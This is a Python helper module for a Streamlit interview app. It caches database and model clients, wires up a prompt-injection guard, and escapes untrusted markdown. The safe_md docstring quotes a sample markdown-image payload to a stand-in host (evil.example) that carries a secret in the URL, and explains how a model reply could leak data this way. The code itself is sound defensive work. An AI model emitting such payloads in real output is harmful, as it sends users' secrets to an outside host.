"""Shared UI plumbing: cached resources and small helpers used by every page.

Streamlit reruns the whole script on every click, so expensive objects (the DB engine, API clients) are
created once with st.cache_resource and reused across reruns.
"""

import re

import streamlit as st
from sqlalchemy.engine import Engine
from streamlit.errors import StreamlitAPIException

from interview_app.config import get_settings
from interview_app.db import init_db, make_engine
from interview_app.interview.engine import EngineDeps
from interview_app.llm.calllog import make_db_recorder
from interview_app.llm.client import LLMClient
from interview_app.llm.decide import DecisionClient
from interview_app.llm.pricing import PriceCatalog
from interview_app.security import InjectionGuard
from interview_app.users import ensure_local_user


@st.cache_resource
def get_engine() -> Engine:
    engine = make_engine(get_settings().database_url)
    init_db(engine)
    return engine


def current_user_id() -> int:
    """Single local user for now (see interview_app/users.py)."""
    if "user_id" not in st.session_state:
        st.session_state.user_id = ensure_local_user(get_engine())
    return st.session_state.user_id


@st.cache_resource
def get_price_catalog() -> PriceCatalog:
    return PriceCatalog(get_settings())


# --- Untrusted text in markdown ------------------------------------------------------------------

# The characters that start markdown syntax: emphasis, code, links and images, raw HTML, headings, lists,
# tables, and Streamlit's own extensions `$` (LaTeX), `:red[...]` (colours) and `:material/...:` (icons).
# CommonMark renders a backslash-escaped punctuation character as itself. Escaping `:` also breaks bare
# `https://` autolinks. Harmless punctuation (`.`, `?`, `,`) stays as it is, so the text stays readable.
_MD_PUNCTUATION = re.compile(r"([\\`*_{}\[\]()<>#+\-!|~$:])")


def safe_md(text: str | None, inline: bool = False) -> str:
    """Make model or user text safe to pass to st.markdown, chat messages, labels and alerts.

    Answers, documents and model replies are untrusted (OWASP LLM01/LLM05): a reply containing
    `![](https://evil.example/?d=<secret>)` would make the browser fetch that URL (data exfiltration), a
    link could phish, and a salary like "$90k to $110k" would be typeset as LaTeX. Escaping shows the
    text exactly as written, with no formatting. `inline=True` folds line breaks into spaces, for text
    placed inside a single line (a label, a list item, italics).
    """
    text = _MD_PUNCTUATION.sub(r"\\\1", text or "")
    if inline:
        return " ".join(text.split())
    # Markdown joins single line breaks into one paragraph; two trailing spaces keep the user's breaks.
    return text.replace("\n", "  \n")


def short(text: str | None, limit: int = 90) -> str:
    """Shorten text for a label, cutting at a word boundary so no word is chopped in half."""
    text = " ".join((text or "").split())
    if len(text) <= limit:
        return text
    cut = text[:limit].rsplit(" ", 1)[0] or text[:limit]
    return cut.rstrip(",;:.-—") + "…"


def page_link(page: str, label: str, icon: str | None = None) -> None:
    """st.page_link, falling back to plain text when the page runs on its own (tests run one page
    file without main.py's st.navigation, and then Streamlit can't resolve the page path)."""
    try:
        st.page_link(page, label=label, icon=icon)
    except StreamlitAPIException:
        st.caption(label)


def go_button(
    page: str,
    label: str,
    icon: str | None = None,
    key: str | None = None,
    primary: bool = True,
    state: dict | None = None,
) -> None:
    """A button that opens another page, for a call to action that must stand out (a page link looks
    like plain navigation). `state` is written to session_state first, e.g. which interview to open."""
    if st.button(label, icon=icon, key=key, type="primary" if primary else "secondary"):
        for name, value in (state or {}).items():
            st.session_state[name] = value
        try:
            st.switch_page(page)
        except StreamlitAPIException:
            st.caption(label)  # a page run on its own (tests) has no navigation to switch with


def slider_start(questions: int) -> int:
    """A saved or usual question count clamped into the slider's range (Limits), so a value saved
    before the range was changed in .env can't make st.slider raise."""
    limits = get_settings().limits
    return min(max(questions, limits.min_main_questions), limits.max_main_questions)


def kept_widget(widget, key: str, default, *args, **kwargs):
    """Draw a widget whose value survives runs in which it isn't drawn (a hidden section, a slider that
    only shows for one interview type).

    Streamlit drops a widget's state in any run where the widget isn't drawn, so its value would reset.
    A shadow copy under another key (not a widget key, so Streamlit keeps it) seeds the widget the next
    time it is drawn. The widget gets no default of its own: giving both a default and a session_state
    value makes Streamlit warn.
    """
    shadow = f"kept_{key}"
    if key not in st.session_state:
        st.session_state[key] = st.session_state.get(shadow, default)
    value = widget(*args, key=key, **kwargs)
    st.session_state[shadow] = value
    return value


# --- Model clients ---------------------------------------------------------------------------------


@st.cache_resource
def _user_decider(user_id: int) -> DecisionClient:
    # The user-level Jev client (calls outside any interview). Cached because each DecisionClient opens
    # its own HTTP client, and engine_deps() runs on many reruns.
    return DecisionClient(get_settings(), recorder=make_db_recorder(get_engine(), user_id))


def engine_deps() -> EngineDeps:
    """Wire the interview engine to real models, the call log, pricing and the injection guard.

    Cheap to call: the factories below build a client only when the engine asks for one, bound to that
    interview session so every call is recorded against it."""
    engine, cfg, user_id = get_engine(), get_settings(), current_user_id()

    def make_llm(uid: int, session_id: int | None) -> LLMClient:
        return LLMClient(cfg, recorder=make_db_recorder(engine, uid, session_id), pricing=get_price_catalog())

    def make_decider(uid: int, session_id: int | None) -> DecisionClient:
        # Bound to the session like make_llm, so guard and live-score calls count in that interview's cost.
        return DecisionClient(cfg, recorder=make_db_recorder(engine, uid, session_id))

    decider = _user_decider(user_id)
    return EngineDeps(
        engine=engine,
        settings=cfg,
        make_llm=make_llm,
        guard=InjectionGuard(cfg, decider),
        decider=decider,
        make_decider=make_decider,
    )


@st.cache_resource
def _document_guard_for(user_id: int) -> InjectionGuard:
    # Document checks belong to no interview, so they use the user-level Jev client, and one guard per
    # user is reused across reruns.
    return InjectionGuard(get_settings(), _user_decider(user_id))


def document_guard() -> InjectionGuard:
    """Injection guard for uploaded documents (rules first, then Jev)."""
    return _document_guard_for(current_user_id())
